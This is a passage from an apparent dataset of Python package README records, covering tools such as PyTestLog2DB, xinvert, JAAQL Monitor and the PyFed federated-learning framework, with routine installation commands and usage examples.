    -   [Maintainers](#maintainers)
    -   [Contributors](#contributors)
    -   [License](#license)

Getting Started
---------------

[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
is the tool that helps to import [PyTest](https://docs.pytest.org)
results file(s) (as [JUnit XML](https://llg.cubic.org/docs/junit)
format) to
[TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp)
Dashboard.

[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
tool is operating system independent and only works with Python 3.

### How to install

[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
is not available on [PyPI](https://pypi.org/) now.

But you can install this package directly from Github repository as
below:

    pip install git+https://github.com/test-fullautomation/python-pytestlog2db.git

Or you can clone sourcecode to your local directory then install this
package with below steps:

    git clone https://github.com/test-fullautomation/python-pytestlog2db.git
    cd python-pytestlog2db
    python setup.py install

After succesful installation, the executable file **PyTestLog2DB** will
be available (under *Scripts* folder of Python on Windows and
*\~/.local/bin/* folder on Linux).

In case above location is added to **PATH** environment variable then
you can run it directly as operation system\'s command.

Usage
-----

[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
requires the [PyTest](https://docs.pytest.org) result file(s) which
contains the test result in [JUnit
XML](https://llg.cubic.org/docs/junit) format and
[TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp)\'s
database information for importing.

Use below command to get tools\'s usage

    PyTestLog2DB -h

The usage should be showed as below:

    usage: PyTestLog2DB (PyTestXMLReport to TestResultWebApp importer) [-h] [-v] [--recursive] [--dryrun] [--append] [--UUID UUID] [--variant VARIANT] [--versions VERSIONS] [--config CONFIG] 
                                                                       resultxmlfile server user password database

    PyTestLog2DB imports pytest JUnit XML report file(s)generated by pytest into a WebApp database.

    positional arguments:
    resultxmlfile        absolute or relative path to the pytest JUnit XML report file or directory of report files to be imported.
    server               server which hosts the database (IP or URL).
    user                 user for database login.
    password             password for database login.
    database             database schema for database login.

    optional arguments:
    -h, --help           show this help message and exit
    -v                   Version of the PyTestLog2DB importer.
    --recursive          if set, then the path is searched recursively for output files to be imported.
    --dryrun             if set, then verify all input arguments (includes DB connection) and show what would be done.
    --append             is used in combination with --UUID . If set, allow to append new result(s) to existing execution result UUID in -UUID argument.
    --UUID UUID          UUID used to identify the import and version ID on webapp. If not provided PyTestLog2DB will generate an UUID for the whole import.
    --variant VARIANT    variant name to be set for this import.
    --versions VERSIONS  metadata: Versions (Software;Hardware;Test) to be set for this import (semicolon separated).
    --config CONFIG      configuration json file for component mapping information.

The below command is simple usage with all required arguments to import
[PyTest](https://docs.pytest.org) results into TestResultWebApp\'s
database:

    PyTestLog2DB     

Besides the executable file, you can also run tool as a Python module

    python -m PyTestLog2DB     

Example
-------

In order the import the robot result(s) to TestResultWebApp\'s database,
we need the [PyTest](https://docs.pytest.org) result file in [JUnit
XML](https://llg.cubic.org/docs/junit) format.

So, firstly execute the [PyTest](https://docs.pytest.org) testcase(s) to
get the result file(s). But the **\*.xml** result file is not generated
by default.

We need to specify the argument *\--junit-xml=\* when executing
[PyTest](https://docs.pytest.org) to get the generated [JUnit
XML](https://llg.cubic.org/docs/junit) report file at given path.

E.g: :

    pytest --junit-xml=path/to/result.xml pytest/folder

After that, the **\*.xml** result file will be available at
**path/to/result.xml** and can be used for importing to
[TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp)
with command:

    PyTestLog2DB path/to/result.xml localhost test_user test_pw test_db

Then, open TestResultWebApp with your favourite browser and you will see
how wonderful the execution result is displayed as below figures:

Dashboard view:

![Dashboard view](packagedoc/additional_docs/pictures/Dashboard.png)

Datatable view:

![Datatable view](packagedoc/additional_docs/pictures/Datatable.png)

### Notes:

> The **\*.xml** report file generated by PyTest contains only the
> testcase result(s) and less metadata information about the test
> execution such as *project/variant*, *software version*, *tester* ,
> *component*, \... which are required by
> [TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp).
>
> So that,
> [PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
> will handle those information with the default values.
>
> But you can use the optional argument *\--config CONFIG* to specify
> those information when importing to
> [TestResultWebApp](https://github.com/test-fullautomation/TestResultWebApp)\'s
> database.
>
> Sample configuration file:
>
>     {
>        ""variant""   : ""MyProject"",
>        ""version_sw"": ""0.1.1"",
>        ""components"": {
>           ""Testsuite1""       : ""test-data.test_tsclass.TestSuite1"",
>           ""Testsuite2""       : ""test-data.test_tsclass.TestSuite2"",
>           ""Others""          : [
>              ""test-data.test_ts1"",
>              ""test-data.test_ts2""
>           ]
>        },
>        ""tester""    : ""Tran Duy Ngoan""
>     }
>
> Please refer [PyTestLog2DB tool's
> Documentation](https://github.com/test-fullautomation/python-pytestlog2db/blob/develop/PyTestLog2DB/PyTestLog2DB.pdf)
> for more detail about default values and the configuration json file.

Contribution
------------

We are always searching support and you are cordially invited to help to
improve
[PyTestLog2DB](https://github.com/test-fullautomation/python-pytestlog2db)
tool.

Sourcecode Documentation
------------------------

To understand more detail about the tool\'s features, parameters and how
PyTest result(s) will be displayed on TestResultWebApp, please refer to
[PyTestLog2DB tool's
Documentation](https://github.com/test-fullautomation/python-pytestlog2db/blob/develop/PyTestLog2DB/PyTestLog2DB.pdf).

Feedback
--------

Please feel free to give any feedback to us via

Email to: [Thomas Pollerspöck](mailto:Thomas.Pollerspoeck@de.bosch.com)

Issue tracking: [PyTestLog2DB
Issues](https://github.com/test-fullautomation/python-pytestlog2db/issues)

About
-----

### Maintainers

[Thomas Pollerspöck](mailto:Thomas.Pollerspoeck@de.bosch.com)

[Holger Queckenstedt](mailto:Holger.Queckenstedt@de.bosch.com)

[Tran Duy Ngoan](mailto:Ngoan.TranDuy@vn.bosch.com)

### Contributors

[Nguyen Huynh Tri Cuong](mailto:Cuong.NguyenHuynhTri@vn.bosch.com)

[Mai Dinh Nam Son](mailto:Son.MaiDinhNam@vn.bosch.com)

[Tran Hoang Nguyen](mailto:Nguyen.TranHoang@vn.bosch.com)

### License

Copyright 2020-2022 Robert Bosch GmbH

Licensed under the Apache License, Version 2.0 (the \""License\""); you
may not use this file except in compliance with the License. You may
obtain a copy of the License at

> [![License: Apache
> v2](https://img.shields.io/pypi/l/robotframework.svg)](http://www.apache.org/licenses/LICENSE-2.0.html)

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an \""AS IS\"" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.


",test-fullautomation/python-pytestlog2db
in-toto-attestation,https://github.com/in-toto/attestation,1,481,481,"# Python Implementation of in-toto/attestation

This package contains Python bindings for in-toto/attestation. Its contents are
autogenerated using
[protobuf definitions](https://github.com/in-toto/attestation/tree/main/protos).

For more information, see the
[in-toto Attestation Framework](https://github.com/in-toto/attestation).

## Versioning

At the moment, this library is versioned <1.0 as we work towards stabilizing the
protobuf definitions and the available predicates.
","# Python Implementation of in-toto/attestation

This package contains Python bindings for in-toto/attestation. Its contents are
autogenerated using
[protobuf definitions](https://github.com/in-toto/attestation/tree/main/protos).

For more information, see the
[in-toto Attestation Framework](https://github.com/in-toto/attestation).

## Versioning

At the moment, this library is versioned <1.0 as we work towards stabilizing the
protobuf definitions and the available predicates.
",in-toto/attestation
sqlite-sync,https://github.com/RobertMeow/sqlite_sync,0,836,836,"SQLite3 is a lightweight embeddable database that is widely used in various projects. However, using SQLite3 multithreaded can lead to unexpected results such as data loss, blocking, recursive errors.

Our library solves this problem by providing a solution for SQLite3 multithreading. We provide an improved interface that allows database relationships to be used from different connections, thus avoiding locking the database and ensuring data integrity.

The library provides a simple and clear API that allows you to quickly and easily create and manipulate various UDP socket connections.

Our features, such as SQLite3 concurrency, great performance, and a simple API, allow developers to interact with their database more conveniently and quickly. Our goal is to help developers build efficient and stable systems using SQLite3.
","SQLite3 is a lightweight embeddable database that is widely used in various projects. However, using SQLite3 multithreaded can lead to unexpected results such as data loss, blocking, recursive errors.

Our library solves this problem by providing a solution for SQLite3 multithreading. We provide an improved interface that allows database relationships to be used from different connections, thus avoiding locking the database and ensuring data integrity.

The library provides a simple and clear API that allows you to quickly and easily create and manipulate various UDP socket connections.

Our features, such as SQLite3 concurrency, great performance, and a simple API, allow developers to interact with their database more conveniently and quickly. Our goal is to help developers build efficient and stable systems using SQLite3.
",robertmeow/sqlite_sync
jaaql-monitor,https://github.com/JAAQL/JAAQL-monitor,1,1052,1052,"# Usage
JAAQL Monitor can be called as such

    jaaql_monitor.exe creds_file
    
Where creds_file is a file of the format

    jaaql_url
    username
    password

And as an example

    jaaql.io
    superjaaql
    passw0rd

Then it will accept input over standard input. Scripts can be separated via \p and \g. \p Will print everything in the standard input so far (since the last \g) and \g will submit everything in the standard input so far to jaaql (since the last \g). So \p\g will print and submit to jaaql. Any errors which we receive will be output on stdin and stderr

# Building
To build you will need to have a python environment (3.8) setup locally. Building will produce a windows executable (the latest executable is in the repo if you require it). If you are on linux you can create an executable as well but you need to install python to do that so you might as well just use the python script. To build please run the commands below

    pyinstaller -F main.py

# Running locally
Please install requirements.txt. Using python 3.11

","# Usage
JAAQL Monitor can be called as such

    jaaql_monitor.exe creds_file
    
Where creds_file is a file of the format

    jaaql_url
    username
    password

And as an example

    jaaql.io
    superjaaql
    passw0rd

Then it will accept input over standard input. Scripts can be separated via \p and \g. \p Will print everything in the standard input so far (since the last \g) and \g will submit everything in the standard input so far to jaaql (since the last \g). So \p\g will print and submit to jaaql. Any errors which we receive will be output on stdin and stderr

# Building
To build you will need to have a python environment (3.8) setup locally. Building will produce a windows executable (the latest executable is in the repo if you require it). If you are on linux you can create an executable as well but you need to install python to do that so you might as well just use the python script. To build please run the commands below

    pyinstaller -F main.py

# Running locally
Please install requirements.txt. Using python 3.11

",jaaql/jaaql-monitor
siq3d,https://github.com/simonlbd1/SiQ-3D,11,755,755,"This Python-based software tool, SiQ-3D (Single-cell image Quantifier for 3D), optimizes Deep Learning (DL)-based 3D image segmentation, single-cell phenotype classification and tracking to automatically quantify and convert 3D live-cell imaging movies into multi-dimensional dynamic data for different interacting cell types in a 3D tissue/organ microenvironment. The SiQ-3D quantified results are output in an excel file of cell position and phenotype at each time point together with labelled images of the segmented single cells for each cell type in the imaging dataset. SiQ-3D can be easily customized to analyze 3D microscopy data from both in vitro and in vivo imaging of diverse tissue/organ models that comprise multiple interacting cell types.
","This Python-based software tool, SiQ-3D (Single-cell image Quantifier for 3D), optimizes Deep Learning (DL)-based 3D image segmentation, single-cell phenotype classification and tracking to automatically quantify and convert 3D live-cell imaging movies into multi-dimensional dynamic data for different interacting cell types in a 3D tissue/organ microenvironment. The SiQ-3D quantified results are output in an excel file of cell position and phenotype at each time point together with labelled images of the segmented single cells for each cell type in the imaging dataset. SiQ-3D can be easily customized to analyze 3D microscopy data from both in vitro and in vivo imaging of diverse tissue/organ models that comprise multiple interacting cell types.
",simonlbd1/siq-3d
branch-time,https://github.com/icaronunes/branch-time,5,1565,1406,"# Time Branch

Time Branch is a command-line interface tool that allows you to track the time you spend working on different branches in your repository. With Time Branch, you can easily monitor how much time you spend in each branch, helping you stay on top of your activities and improve productivity. Additionally, Time Branch offers features to export collected data to an output file, making it easy to analyze and share information with your team. With the help of Time Branch, you can optimize your software development activities and improve your efficiency

## Install

```bash
pip install branch-time
```

## How to use

- #### time values ​​in minutes

```bash
branchtime 'your\repository.git' --time 20 --output 'output\directory'
branchtime 'your\repository.git' -t 20 -o 'output\directory'
branchtime 'your\repository.git' --time 20 --output 'output\directory'
or
branch-time 'your\repository.git' --time 20 --output 'output\directory'
```

### default values:

- repository = your current directory
- --time = 5 minutes
- --output = your current directory

## Help

<img src=""https://firebasestorage.googleapis.com/v0/b/livro-android-1327.appspot.com/o/help%20branch.PNG?alt=media&token=0739a15b-91b7-41f5-801f-1b7674f492f6"">

## Output

2023-04-24.txt

```txt
Branch: master - Time: 20:57:17
FINISHED... 21:44:11

Branch: main - Time: 21:58:19

Branch: AUTO-29975 - Time: 22:10:29

Branch: AUTO-32659 - Time: 22:34:10

Branch: AUTO-31839 - Time: 23:18:46

Branch: AUTO-29975 - Time: 23:40:17

Branch: main - Time: 23:55:32
FINISHED... 23:055:33
```
","# Time Branch

Time Branch is a command-line interface tool that allows you to track the time you spend working on different branches in your repository. With Time Branch, you can easily monitor how much time you spend in each branch, helping you stay on top of your activities and improve productivity. Additionally, Time Branch offers features to export collected data to an output file, making it easy to analyze and share information with your team. With the help of Time Branch, you can optimize your software development activities and improve your efficiency

## Install

```bash
pip install branch-time
```

## How to use

- #### time values ​​in minutes

```bash
branchtime 'your\repository.git' --time 20 --output 'output\directory'
branchtime 'your\repository.git' -t 20 -o 'output\directory'
branchtime 'your\repository.git' --time 20 --output 'output\directory'
or
branch-time 'your\repository.git' --time 20 --output 'output\directory'
```

### default values:

- repository = your current directory
- --time = 5 minutes
- --output = your current directory

## Help



## Output

2023-04-24.txt

```txt
Branch: master - Time: 20:57:17
FINISHED... 21:44:11

Branch: main - Time: 21:58:19

Branch: AUTO-29975 - Time: 22:10:29

Branch: AUTO-32659 - Time: 22:34:10

Branch: AUTO-31839 - Time: 23:18:46

Branch: AUTO-29975 - Time: 23:40:17

Branch: main - Time: 23:55:32
FINISHED... 23:055:33
```
",icaronunes/branch-time
xinvert,https://github.com/miniufo/xinvert,4,7814,7814,"# xinvert

[![DOI](https://zenodo.org/badge/323045845.svg)](https://zenodo.org/badge/latestdoi/323045845)
![GitHub](https://img.shields.io/github/license/miniufo/xinvert)
[![Documentation Status](https://readthedocs.org/projects/xinvert/badge/?version=latest)](https://xinvert.readthedocs.io/en/latest/?badge=latest)
[![PyPI version](https://badge.fury.io/py/xinvert.svg)](https://badge.fury.io/py/xinvert)
![Workflow](https://github.com/miniufo/xinvert/actions/workflows/python-publish.yml/badge.svg)

![animate plot](https://raw.githubusercontent.com/miniufo/xinvert/master/pics/animateConverge.gif)


## 1. Introduction
Researches on meteorology and oceanography usually encounter [inversion problems](https://doi.org/10.1017/CBO9780511629570) that need to be solved numerically.  One of the classical inversion problem is to solve Poisson equation for a streamfunction $\psi$ given the vertical component of vorticity $\zeta$ and proper boundary conditions.

> $$\nabla^2\psi=\zeta$$

Nowadays [`xarray`](http://xarray.pydata.org/en/stable/) becomes a popular data structure commonly used in [Big Data Geoscience](https://pangeo.io/).  Since the whole 4D data, as well as the coordinate information, are all combined into [`xarray`](http://xarray.pydata.org/en/stable/), solving the inversion problem become quite straightforward and the only input would be just one [`xarray.DataArray`](http://xarray.pydata.org/en/stable/) of vorticity.  Inversion on the spherical earth, like some meteorological problems, could utilize the spherical harmonics like [windspharm](https://github.com/ajdawson/windspharm), which would be more efficient using FFT than SOR used here.  However, in the case of ocean, SOR method is definitely a better choice in the presence of irregular land/sea mask.

More importantly, this could be generalized into a numerical solver for elliptical equation using [SOR](https://mathworld.wolfram.com/SuccessiveOverrelaxationMethod.html) method, with spatially-varying coefficients.  Various popular inversion problems in geofluid dynamics will be illustrated as examples.

One problem with SOR is that the speed of iteration using **explicit loops in Python** will be **e-x-t-r-e-m-e-l-y ... s-l-o-w**!  A very suitable solution here is to use [`numba`](https://numba.pydata.org/).  We may try our best to speed things up using more hardwares (possibly GPU).

Classical problems include Gill-Matsuno model, Stommel-Munk model, QG omega model, PV inversion model, Swayer-Eliassen balance model...  A complete list of the classical inversion problems can be found at [this notebook](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/Introduction.ipynb).

Why `xinvert`?

- **Thinking and coding in equations:** User APIs are very close to the equations: unknowns are on the LHS of `=`, whereas the known forcings are on its RHS;
- **Genearlize all the steady-state problems:** All the known steady-state problems in geophysical fluid dynamics can be easily adapted to fit the solvers;
- **Very short parameter list:** Passing a single `xarray` forcing is enough for the inversion.  Coordinates information is already encapsulated.
- **Flexible model parameters:** Model paramters can be either a constant, or varying with a specific dimension (like Coriolis $f$), or fully varying with space and time, due to the use of `xarray`'s broadcasting capability;
- **Parallel inverting:** The use of `xarray`, and thus `dask` allow parallel inverting, which is almost transparent to the user;
- **Pure Python code for C-code speed:** The use of `numba` allow pure python code in this package but native speed;

---
## 2. How to install
**Requirements**
`xinvert` is developed under the environment with `xarray` (=version 0.15.0), `dask` (=version 2.11.0), `numpy` (=version 1.15.4), and `numba` (=version 0.51.2).  Older versions of these packages are not well tested.

**Install via pip** (not yet)
```
pip install xinvert
```

**Install from github**
```
git clone https://github.com/miniufo/xinvert.git
cd xinvert
python setup.py install
```


---
## 3. Example: Helmholtz decomposition
This is a classical problem in both meteorology and oceanography that a vector flow field can be deomposed into rotational and divergent parts, where rotational and divergent parts are represented by the streamfunction and velocity potential.  Given vorticity (vor) and divergence (div) as the forcing functions, one can invert the streamfunction and velocity potential directly.

### 3.1 Atmospheric demonstration
Here is an atmospheric demonstration with no lateral boundaries:
```python
import xarray as xr
from xinvert import invert_Poisson

dset = xr.open_dataset('data.nc')

vor = dset.vor

# specify boundary conditions in invert parameters
# 'extend' for lat, 'periodic' for lon
iParams = {'BCs': ['extend', 'periodic']}

# Invert within lat/lon plane, with extend and periodic boundary
# conditions in lat and lon respectively
psi = invert_Poisson(vor, dims=['lat','lon'], iParams=iParams)
```
![atmospheric plot](https://raw.githubusercontent.com/miniufo/xinvert/master/pics/atmosExample.png)


### 3.2 Oceanic demonstration
Here is a oceanic demonstration with complex lateral boundaries of land/sea:
```python
import xarray as xr
from xinvert import invert_Poisson

dset = xr.open_dataset('mitgcm.nc')

vor = dset.vor

# specify boundary conditions in invert parameters
# 'fixed' for lat, 'periodic' for lon; undefined value is 0
iParams = {'BCs':['fixed', 'periodic'], 'undef':0}

# Invert within YG/XGplane, with fixed and periodic boundary respectively.
# Kwarg undef is used as a mask for land value.
psi = invert_Poisson(vor, dims=['YG','XG'], iParams=iParams)
```
![oceanic plot](https://raw.githubusercontent.com/miniufo/xinvert/master/pics/oceanExample.png)

### 3.3 Animate the convergence of iteration
One can see the whole convergence process of SOR iteration as:
```python
from xinvert import invert_Poisson_animated

# input of vor need to be two dimensional only;
# psi has one more dimension than vor as iteration, which could be animated over.
# Here psi has 40 frames and loop 1 per frame (final state is after 40 iterations)
psi = animate_iteration(invert_Poisson, vor, iParams=iParams,
                              loop_per_frame=1, max_frames=40)
```
![animate plot](https://raw.githubusercontent.com/miniufo/xinvert/master/pics/animateConverge.gif)

More examples can be found in these notebooks:
1.  [Poisson equation for streamfunction/velocity potential](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/01_Poisson_equation_horizontal.ipynb);
2.  [Poisson equation for meridional overturning and zonal Walker circulations](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/02_Poisson_equation_vertical.ipynb);
3.  [Geopotential model for balanced mass field](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/03_Balanced_mass_and_flow.ipynb);
4.  [Eliassen model for the meridional overturning circulation](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/04_Eliassen_model.ipynb);
5.  PV inversion for 2D reference state (TODO);
6.  PV inversion for 2D QGPV (TODO);
7.  [Matsuno-Gill model for heat-induced tropical circulation](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/07_Gill_Matsuno_model.ipynb)
8.  [Stommel-Munk model for wind-driven ocean circulation](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/08_Stommel_Munk_model.ipynb)
9.  [Omega equation for quasi-geostrophic vertical motion](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/09_Omega_equation.ipynb);
10. [3D oceanic flow](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/10_3D_Ocean_flow.ipynb);

more to be added...
","# xinvert

[![DOI](https://zenodo.org/badge/323045845.svg)](https://zenodo.org/badge/latestdoi/323045845)
![GitHub](https://img.shields.io/github/license/miniufo/xinvert)
[![Documentation Status](https://readthedocs.org/projects/xinvert/badge/?version=latest)](https://xinvert.readthedocs.io/en/latest/?badge=latest)
[![PyPI version](https://badge.fury.io/py/xinvert.svg)](https://badge.fury.io/py/xinvert)
![Workflow](https://github.com/miniufo/xinvert/actions/workflows/python-publish.yml/badge.svg)

![animate plot](https://raw.githubusercontent.com/miniufo/xinvert/master/pics/animateConverge.gif)


## 1. Introduction
Researches on meteorology and oceanography usually encounter [inversion problems](https://doi.org/10.1017/CBO9780511629570) that need to be solved numerically.  One of the classical inversion problem is to solve Poisson equation for a streamfunction $\psi$ given the vertical component of vorticity $\zeta$ and proper boundary conditions.

> $$\nabla^2\psi=\zeta$$

Nowadays [`xarray`](http://xarray.pydata.org/en/stable/) becomes a popular data structure commonly used in [Big Data Geoscience](https://pangeo.io/).  Since the whole 4D data, as well as the coordinate information, are all combined into [`xarray`](http://xarray.pydata.org/en/stable/), solving the inversion problem become quite straightforward and the only input would be just one [`xarray.DataArray`](http://xarray.pydata.org/en/stable/) of vorticity.  Inversion on the spherical earth, like some meteorological problems, could utilize the spherical harmonics like [windspharm](https://github.com/ajdawson/windspharm), which would be more efficient using FFT than SOR used here.  However, in the case of ocean, SOR method is definitely a better choice in the presence of irregular land/sea mask.

More importantly, this could be generalized into a numerical solver for elliptical equation using [SOR](https://mathworld.wolfram.com/SuccessiveOverrelaxationMethod.html) method, with spatially-varying coefficients.  Various popular inversion problems in geofluid dynamics will be illustrated as examples.

One problem with SOR is that the speed of iteration using **explicit loops in Python** will be **e-x-t-r-e-m-e-l-y ... s-l-o-w**!  A very suitable solution here is to use [`numba`](https://numba.pydata.org/).  We may try our best to speed things up using more hardwares (possibly GPU).

Classical problems include Gill-Matsuno model, Stommel-Munk model, QG omega model, PV inversion model, Swayer-Eliassen balance model...  A complete list of the classical inversion problems can be found at [this notebook](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/Introduction.ipynb).

Why `xinvert`?

- **Thinking and coding in equations:** User APIs are very close to the equations: unknowns are on the LHS of `=`, whereas the known forcings are on its RHS;
- **Genearlize all the steady-state problems:** All the known steady-state problems in geophysical fluid dynamics can be easily adapted to fit the solvers;
- **Very short parameter list:** Passing a single `xarray` forcing is enough for the inversion.  Coordinates information is already encapsulated.
- **Flexible model parameters:** Model paramters can be either a constant, or varying with a specific dimension (like Coriolis $f$), or fully varying with space and time, due to the use of `xarray`'s broadcasting capability;
- **Parallel inverting:** The use of `xarray`, and thus `dask` allow parallel inverting, which is almost transparent to the user;
- **Pure Python code for C-code speed:** The use of `numba` allow pure python code in this package but native speed;

---
## 2. How to install
**Requirements**
`xinvert` is developed under the environment with `xarray` (=version 0.15.0), `dask` (=version 2.11.0), `numpy` (=version 1.15.4), and `numba` (=version 0.51.2).  Older versions of these packages are not well tested.

**Install via pip** (not yet)
```
pip install xinvert
```

**Install from github**
```
git clone https://github.com/miniufo/xinvert.git
cd xinvert
python setup.py install
```


---
## 3. Example: Helmholtz decomposition
This is a classical problem in both meteorology and oceanography that a vector flow field can be deomposed into rotational and divergent parts, where rotational and divergent parts are represented by the streamfunction and velocity potential.  Given vorticity (vor) and divergence (div) as the forcing functions, one can invert the streamfunction and velocity potential directly.

### 3.1 Atmospheric demonstration
Here is an atmospheric demonstration with no lateral boundaries:
```python
import xarray as xr
from xinvert import invert_Poisson

dset = xr.open_dataset('data.nc')

vor = dset.vor

# specify boundary conditions in invert parameters
# 'extend' for lat, 'periodic' for lon
iParams = {'BCs': ['extend', 'periodic']}

# Invert within lat/lon plane, with extend and periodic boundary
# conditions in lat and lon respectively
psi = invert_Poisson(vor, dims=['lat','lon'], iParams=iParams)
```
![atmospheric plot](https://raw.githubusercontent.com/miniufo/xinvert/master/pics/atmosExample.png)


### 3.2 Oceanic demonstration
Here is a oceanic demonstration with complex lateral boundaries of land/sea:
```python
import xarray as xr
from xinvert import invert_Poisson

dset = xr.open_dataset('mitgcm.nc')

vor = dset.vor

# specify boundary conditions in invert parameters
# 'fixed' for lat, 'periodic' for lon; undefined value is 0
iParams = {'BCs':['fixed', 'periodic'], 'undef':0}

# Invert within YG/XGplane, with fixed and periodic boundary respectively.
# Kwarg undef is used as a mask for land value.
psi = invert_Poisson(vor, dims=['YG','XG'], iParams=iParams)
```
![oceanic plot](https://raw.githubusercontent.com/miniufo/xinvert/master/pics/oceanExample.png)

### 3.3 Animate the convergence of iteration
One can see the whole convergence process of SOR iteration as:
```python
from xinvert import invert_Poisson_animated

# input of vor need to be two dimensional only;
# psi has one more dimension than vor as iteration, which could be animated over.
# Here psi has 40 frames and loop 1 per frame (final state is after 40 iterations)
psi = animate_iteration(invert_Poisson, vor, iParams=iParams,
                              loop_per_frame=1, max_frames=40)
```
![animate plot](https://raw.githubusercontent.com/miniufo/xinvert/master/pics/animateConverge.gif)

More examples can be found in these notebooks:
1.  [Poisson equation for streamfunction/velocity potential](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/01_Poisson_equation_horizontal.ipynb);
2.  [Poisson equation for meridional overturning and zonal Walker circulations](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/02_Poisson_equation_vertical.ipynb);
3.  [Geopotential model for balanced mass field](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/03_Balanced_mass_and_flow.ipynb);
4.  [Eliassen model for the meridional overturning circulation](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/04_Eliassen_model.ipynb);
5.  PV inversion for 2D reference state (TODO);
6.  PV inversion for 2D QGPV (TODO);
7.  [Matsuno-Gill model for heat-induced tropical circulation](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/07_Gill_Matsuno_model.ipynb)
8.  [Stommel-Munk model for wind-driven ocean circulation](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/08_Stommel_Munk_model.ipynb)
9.  [Omega equation for quasi-geostrophic vertical motion](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/09_Omega_equation.ipynb);
10. [3D oceanic flow](https://github.com/miniufo/xinvert/blob/master/docs/source/notebooks/10_3D_Ocean_flow.ipynb);

more to be added...
",miniufo/xinvert
passlass4,https://github.com/TheCodingFreakj/password-manager,0,48,48,"A simple python wrapper for creating passwords
","A simple python wrapper for creating passwords
",thecodingfreakj/password-manager
pyfedm,https://github.com/amirrezasokhankhosh/PyFed,4,5827,5817,"# PyFed

PyFed is an open-source framework for federated learning algorithms. Federated Learning is a subfield of machine learning which trains a global model using one server and multiple clients which contain their separate datasets. 
This approach helps clients with the problems of sharing their local data with a server and the risk of data leakage. PyFed is a straightforward and brief package that allows scientists to try Federated Learning for any model using any dataset. Furthermore, PyFed uses Tensorboard to demonstrate the history of training of each client per round.

PyFed implements FL using sockets, processes, and threads. Simply put, each client will run its particular process and tries to establish a socket connection with the server, which also has its specific process. 
Once initiated, each connection will be handled by one thread of the server's process. Each thread will communicate with its respective client to receive the trained weights per round. 
Once they receive the result of one round, threads will return the weights to the server's process, which will arrive at a new model using the mentioned weights. The server will send the new model to the clients using newly initiated threads.
 
PyFed is mainly based on two classes:
 
- __FL_Server__: which represents the server to which clients communicate in a federated learning problem. The __train()__ function of this class handles socket connections and the FL policy. </br>
- __FL_Client__: which represents each client in a federated learning network. An object of this class handles training procedure any global model on any local data.

Currently, PyFed is limited to FedAvg as its only federated learning policy; however, we will introduce a broader range of configurations for FL experiments in the coming versions.

# Features
PyFed contains two critical classes: FL_Server and FL_Client, which are responsible for server and client actions in a federated learning problem, respectively. </br>
* __FL_Server.train()__ establishes a socket connections with clients and handles weight averaging. In addition, at the end of all rounds a tensorboard session will be started to reveal the efficancy of each client.
* __FL_Server.test()__ will test the final model on the given test data.
* __FL_Client.train()__ will initiate a training session for the client who runs the command. Each client will train the received model on its local dataset.

# Usage
Utilizing PyFed is effortless and time efficient. Following is an example of using this package for the mnist dataset.
# data.py
This is for distributing data among clients and a server.

    import numpy as np
    from sklearn.datasets import fetch_openml

    num_clients = 3
    mnist = fetch_openml(""mnist_784"", version=1)
    X, y = np.array(mnist[""data""]), np.array(mnist[""target""], dtype='int16')
    data_count = len(y) // (num_clients + 1)

    for i in range(num_clients):
        client_i_X, client_i_y = X[data_count*i:data_count*(i + 1)], y[data_count*i:data_count*(i + 1)]
        np.save(f""./data_client_{i+1}.npy"", client_i_X)
        np.save(f""./target_client_{i+1}.npy"", client_i_y)

    server_i_X, server_i_y = X[data_count*num_clients:], y[data_count*num_clients:]
    np.save(f""./data_server.npy"", server_i_X)
    np.save(f""./target_server.npy"", server_i_y)


## server.py
    from pyfed import FL_Server
    import numpy as np
    import tensorflow as tf


    model = tf.keras.models.Sequential()
    model.add(tf.keras.layers.InputLayer((784,)))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(2000, activation='relu'))
    model.add(tf.keras.layers.Dense(1000, activation='relu'))
    model.add(tf.keras.layers.Dense(500, activation='relu'))
    model.add(tf.keras.layers.Dense(10, activation='softmax'))


    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    lr = 3e-4
    num_clients = 3
    rounds = 2


    model.compile(loss=loss,
                optimizer=optimizer(lr),
                metrics=metrics)

    data = np.load(""./data_server.npy"")
    target = np.load(""./target_server.npy"")


    server = FL_Server(model, num_clients, rounds)
    server.train()
    server.test(data, target, loss, optimizer, lr, metrics)

## client_1.py
    from pyfed import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

    loss = ""sparse_categorical_crossentropy""
    optimizer = tf.optimizers.Adam
    metrics = [""accuracy""]

    data = np.load(""./data_client_1.npy"")
    target = np.load(""./target_client_1.npy"")

    client1 = FL_Client(""client_1"", data, target)

    client1.train(epochs, batch_size, lr, loss, optimizer, metrics)
## client_2.py
    from pyfed import FL_Client
    import numpy as np
    import tensorflow as tf

    epochs = 5
    batch_size = 32
    lr = 3e-4

